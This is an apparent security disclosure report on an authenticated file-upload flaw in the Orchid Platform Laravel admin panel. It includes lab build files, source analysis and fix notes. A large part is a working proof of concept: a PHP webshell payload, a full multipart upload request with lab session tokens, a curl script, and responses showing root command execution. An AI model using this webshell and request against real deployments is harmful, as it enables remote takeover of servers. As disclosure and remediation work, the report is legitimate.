### Vulnerability details

**Official website / Product:** https://orchid.software

**Repository:** orchidsoftware/platform (stars at selection: 4801)

**Vulnerability type:** RCE (unrestricted attachment upload to webshell; CWE-434)

**Vulnerability versions:** current master / latest snapshot `b9e8eedadb6ddb32031086ed4727a73b444dea57` (same attachment logic as released 14.53.0 line; `AttachmentController` + `Generator::extension()` have no server-side extension allowlist)

**Vulnerability URL / Parameter:** Authenticated `POST /admin/files` (route `orchid.files.upload`); multipart field `file`; client-controlled `storage` and `path` (no server-side allowlist)

**Complex:** yes

### Verification procedure

1. Rebuild the lab (original `labs/orchid-r30-a3/` may have been cleaned). Stack: Laravel 11 + Orchid Platform (path-installed from commit `b9e8eedadb6ddb32031086ed4727a73b444dea57`), SQLite, base image **`php:8.4-cli-bookworm`** (observed image id `12f6d2ea136f`, ~542MB), host port **21003→8000**, `php artisan serve`. Reconstructable files:

```dockerfile
# Dockerfile (build context must include the platform checkout; see compose notes)
FROM php:8.4-cli-bookworm
RUN apt-get update && apt-get install -y git unzip libsqlite3-dev \
 && docker-php-ext-install pdo_sqlite \
 && curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer
WORKDIR /var/www/html
RUN composer create-project laravel/laravel:^11.0 . --no-interaction \
 && touch database/database.sqlite \
 && sed -i 's/DB_CONNECTION=.*/DB_CONNECTION=sqlite/' .env \
 && sed -i 's#DB_DATABASE=.*#DB_DATABASE=/var/www/html/database/database.sqlite#' .env
# Path-install Orchid: copy the checked-out platform tree to /opt/orchid-platform
COPY orchid-platform /opt/orchid-platform
RUN composer config repositories.orchid path /opt/orchid-platform \
 && composer require orchid/platform:@dev --no-interaction \
 && php artisan orchid:install --no-interaction || true
CMD ["php", "artisan", "serve", "--host=0.0.0.0", "--port=8000"]
```

```yaml
# docker-compose.yml (project dir name orchid-r30-a3 → container orchid-r30-a3)
services:
  orchid:
    build: .
    image: php:8.4-cli-bookworm
    container_name: orchid-r30-a3
    ports:
      - "21003:8000"
```

```bash
# Prepare path source at the audited commit
git clone https://github.com/orchidsoftware/platform.git orchid-platform
cd orchid-platform && git checkout b9e8eedadb6ddb32031086ed4727a73b444dea57 && cd ..
docker compose up -d --build
# Inside the container:
docker exec -it orchid-r30-a3 bash
php artisan orchid:admin "admin@example.com" "Admin123!" "Admin"
php artisan storage:link   # public/storage → storage/app/public so /storage/... is web-reachable
```

Expected topology (observed `docker compose ps` / `docker ps`):

```
NAME            IMAGE                  COMMAND                  SERVICE   STATUS         PORTS
orchid-r30-a3   php:8.4-cli-bookworm   "docker-php-entrypoi…"   orchid    Up             0.0.0.0:21003->8000/tcp
```

Health check: `GET /admin/login` returns HTTP 200.
2. Default admin: `admin@example.com` / `Admin123!` (created via `orchid:admin`).
3. Sign in at `http://127.0.0.1:21003/admin/login` and capture `laravel_session` + `XSRF-TOKEN` cookies; set request header `X-XSRF-TOKEN` to the URL-decoded cookie value (Laravel convention). Cookies/tokens in the PoC below are from the captured lab session — replace with a fresh session when reproducing.
4. `POST /admin/files` with webshell `filename=shell.php`, body `<?php echo "ORCHID_RCE_OK "; echo system($_GET["c"] ?? "id"); ?>`, plus `storage=public` and `path=rce`. Requires `orchid.attachment` (default admin has it).
5. JSON response shows `extension`=`php`, `disk`=`public`, and `relativeUrl` like `/storage/rce/<hash>.php` (PoC: `/storage/rce/185edf2295351a175e6c2508b1a657e79d8b3b1b.php`).
6. Request that URL with `?c=id` and observe `ORCHID_RCE_OK` plus `uid=...` — webshell executes on the web-accessible public disk.

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /admin/files HTTP/1.1
Host: 127.0.0.1:21003
Content-Type: multipart/form-data; boundary=----OrchidBoundary7MA4YWxkTrZu0gW
Accept: application/json
X-Requested-With: XMLHttpRequest
X-XSRF-TOKEN: eyJpdiI6ImZQcmZPanpJbHRjTlAwUjVKSG5rVVE9PSIsInZhbHVlIjoiaGZTR2ZpQjFPWWc5R0ZadGRCSERRL3E5R2dZWTFTVy95TWdDY2xOMG5uYkR2dlI0aHFtcEpENlEzL3MwVjE3WllyMTdlRXNqTllyVWpEYzlCakF6b3BNQWJUeitLMVRiUHpGWFJZbzNEaU5acTd4RWlrdFVPMU1YZG5Nd1ovNlEiLCJtYWMiOiIzZDUxYTc0ZTU1NGY1ZjA0Mjc2N2Q1YWM0OWJlMzk4NTY3ZjViNzEzYTY0NmQ4YzYxZDcxYzg4NDE4ODAxMjZkIiwidGFnIjoiIn0=
Origin: http://127.0.0.1:21003
Referer: http://127.0.0.1:21003/admin/examples/form/advanced
Cookie: XSRF-TOKEN=eyJpdiI6ImZQcmZPanpJbHRjTlAwUjVKSG5rVVE9PSIsInZhbHVlIjoiaGZTR2ZpQjFPWWc5R0ZadGRCSERRL3E5R2dZWTFTVy95TWdDY2xOMG5uYkR2dlI0aHFtcEpENlEzL3MwVjE3WllyMTdlRXNqTllyVWpEYzlCakF6b3BNQWJUeitLMVRiUHpGWFJZbzNEaU5acTd4RWlrdFVPMU1YZG5Nd1ovNlEiLCJtYWMiOiIzZDUxYTc0ZTU1NGY1ZjA0Mjc2N2Q1YWM0OWJlMzk4NTY3ZjViNzEzYTY0NmQ4YzYxZDcxYzg4NDE4ODAxMjZkIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkVOdGsvVHNzbG12R0s0OS9HSU1RaHc9PSIsInZhbHVlIjoibWNnaThrTDRxSG9xd1RDVUkrYjI0RFd5NlVGSFdjb3pHRjVTdTFEZHJlaHhhZDd4bXJpOGhGVENFUWlSTVdDMjdnT05uWDN1U2laanQ0Y2Z2clZNS1lJcEQ3eVFDYmZxc29sMFBlZ2hPN2dHTlphcWhiNklNc0NETFhWQXptZW4iLCJtYWMiOiJhMjczOWI3NmVlOTI2YWUyYTUxMTVmMWFiNjdkZmY2ZjcxOWExMDYyMDBkY2U3MDQxZGFkYzg4YmRhZDE4OTIyIiwidGFnIjoiIn0%3D
Content-Length: 428
Connection: close

------OrchidBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php echo "ORCHID_RCE_OK "; echo system($_GET["c"] ?? "id"); ?>
------OrchidBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="storage"

public
------OrchidBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="path"

rce
------OrchidBoundary7MA4YWxkTrZu0gW--
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Host: 127.0.0.1:21003
Connection: close
X-Powered-By: PHP/8.4.27
Cache-Control: no-cache, private
Date: Sun, 01 Nov 2026 23:41:59 GMT
Content-Type: application/json
Set-Cookie: XSRF-TOKEN=eyJpdiI6IlNwcmt3cjJzOUhhRDhyRTZpWmZ3a1E9PSIsInZhbHVlIjoiU0svY1p1aXIveHZPWXlWTFhKRk5zWEZuQVBjQ0wwRFQ4SjFrRDdhWVMyMHlvV29iZHk5NXcvdWwzRXAwblZwSjg4ejNiRmFPd3E1U3I0bWk4UHVOSGlISWV5TmVqUU1KMThRdlZEYTNmUnduMWJQV0RFWFlReU5EYW94VzhuSkIiLCJtYWMiOiJjODdiOTFiNzI5ZmYyMDJhOTdkNmMyMThlZmZlNWVhODk4MzRiMGQ1OTkyZTJmNWRmNjc1M2UwYmNlNjBhNDA0IiwidGFnIjoiIn0%3D; expires=Mon, 02 Nov 2026 01:41:59 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6InJQaGlmN09hVHFjbzVPdEcvSHRka1E9PSIsInZhbHVlIjoiNFpXTDN6YjdKblNVdFo0VjYzUy9FdVFkYVVYNnNXQ0FQTC9YK2dhTThjdUM1YSs0RlBXQ29qQWRxS1BGNFkwSWIreWcyYzhJbGQzUk1TMWQ2UG1FaWtTTkRKeEdRcTJXV2k2U1lISzRVTGlOM0pZaGlZQVkvcm9JWkV4N3EzRDYiLCJtYWMiOiI2YjQ5MTAxMWNlYmI2ODQ5M2RiZGZmOTBiODczYmNmZmM2YjdkZGQ1MTNhMmY0OGE1MzgwOGE0OGZlODE3N2U2IiwidGFnIjoiIn0%3D; expires=Mon, 02 Nov 2026 01:41:59 GMT; Max-Age=7200; path=/; httponly; samesite=lax

{"name":"185edf2295351a175e6c2508b1a657e79d8b3b1b","original_name":"shell.php","mime":"application\/x-php","extension":"php","size":64,"sort":0,"path":"rce\/","hash":"e32ed28862b3b976ea690c6d83de3180a0f356e1","disk":"public","user_id":1,"group":null,"id":"a31ff521-b960-40dd-9f40-1ba3afacf41b","updated_at":"2026-11-01T23:41:59.000000Z","created_at":"2026-11-01T23:41:59.000000Z","url":"http:\/\/localhost\/storage\/rce\/185edf2295351a175e6c2508b1a657e79d8b3b1b.php","relativeUrl":"\/storage\/rce\/185edf2295351a175e6c2508b1a657e79d8b3b1b.php"}
```

Verification result notes:

- Upload returns HTTP 200 with `"extension":"php"`, `"disk":"public"`, `"path":"rce/"`, and a reachable `relativeUrl`.
- Follow-up webshell hit:

```http
GET /storage/rce/185edf2295351a175e6c2508b1a657e79d8b3b1b.php?c=id HTTP/1.1
Host: 127.0.0.1:21003
Accept: */*
Connection: close
```

```http
HTTP/1.1 200 OK
Host: 127.0.0.1:21003
Date: Sun, 01 Nov 2026 23:41:59 GMT
Connection: close
X-Powered-By: PHP/8.4.27
Content-type: text/html; charset=UTF-8

ORCHID_RCE_OK uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
```

- Command output includes `ORCHID_RCE_OK` and `uid=0(root)` (PHP process user inside the lab container).
- File lands at `storage/app/public/rce/<hash>.php`, exposed via the `public/storage` symlink.

Equivalent curl (replace session Cookie / X-XSRF-TOKEN):

```bash
printf '%s' '<?php echo "ORCHID_RCE_OK "; echo system($_GET["c"] ?? "id"); ?>' > /tmp/orchid-shell.php
curl -sS -D- 'http://127.0.0.1:21003/admin/files' \
  -H 'Accept: application/json' -H 'X-Requested-With: XMLHttpRequest' \
  -H 'X-XSRF-TOKEN: <decoded-xsrf>' \
  -H 'Cookie: XSRF-TOKEN=<url-encoded-xsrf>; laravel_session=<session>' \
  -F 'file=@/tmp/orchid-shell.php;filename=shell.php;type=application/x-php' \
  -F 'storage=public' -F 'path=rce'
curl -sS 'http://127.0.0.1:21003/storage/rce/<hash>.php?c=id'
# Expected output includes: ORCHID_RCE_OK uid=0(root) gid=0(root) groups=0(root)
```

### Vulnerability analysis

Orchid’s attachment upload path `AttachmentController::upload` → `createModel` forwards request `storage` / `path` into `Orchid\Attachment\File` unchanged. The stored extension comes from `UploadedFile::getClientOriginalExtension()` (`Generator::extension()`) with **no server-side MIME/extension allowlist**. The default disk is Laravel `public`, exposed under the web root as `/storage/*` after `storage:link`. Any principal with `orchid.attachment` (default admins and editors granted that permission) can upload a `.php` webshell and achieve RCE.

`Picture` / `Cropper` only set `acceptedFiles: image/*` on the client while sharing the same upload endpoint — an unexpected bypass of the intended image-only control. `path` / `storage` are fully client-trusted and not bound to server-side field configuration.

Trigger / sink source (full path and line numbers):

```php
# File: src/Platform/Http/Controllers/AttachmentController.php
# Lines: 44-52, 98-120
    public function upload(Request $request): JsonResponse
    {
        $attachment = collect($request->allFiles())
            ->flatten()
            ->map(fn (UploadedFile $file) => $this->createModel($file, $request));

        $response = $attachment->count() > 1 ? $attachment : $attachment->first();

        return response()->json($response);
    }

    private function createModel(UploadedFile $file, Request $request)
    {
        $file = resolve(File::class, [
            'file'  => $file,
            'disk'  => $request->input('storage'),
            'group' => $request->input('group'),
        ]);

        if ($request->has('path')) {
            $file->path($request->input('path'));
        }
        // ...
        $model = $file->load();
        // ...
        return $model;
    }
```

```php
# File: src/Attachment/Engines/Generator.php
# Lines: 146-152
    public function extension(): string
    {
        $extension = $this->file->getClientOriginalExtension();

        return empty($extension)
            ? $this->mimes->getExtension($this->file->getClientMimeType(), static::UNKNOWN)
            : $extension;
    }
```

```php
# File: src/Attachment/File.php
# Lines: 153-157
    private function save(): Model
    {
        $this->storage->putFileAs($this->engine->path(), $this->file, $this->engine->fullName(), [
            'mime_type' => $this->engine->mime(),
        ]);
```

### Fix notes

1. Enforce a server-side extension/MIME allowlist in `AttachmentController::upload` / `createModel` (images-only for Picture/Cropper; reject `.php`/`.phtml`/`.phar`/`.htaccess` for Attach). Do not trust `getClientOriginalExtension()` or client Content-Type.
2. Bind `path` / `storage` to server-side field config, or charset-allowlist path and disallow arbitrary disk selection from the client.
3. Prefer a non-web-accessible disk by default, or disable script execution under `/storage` at the web server; serve downloads only through a controlled endpoint.
4. Hunt existing `storage/app/public` trees for unexpected `.php` files on deployed instances.
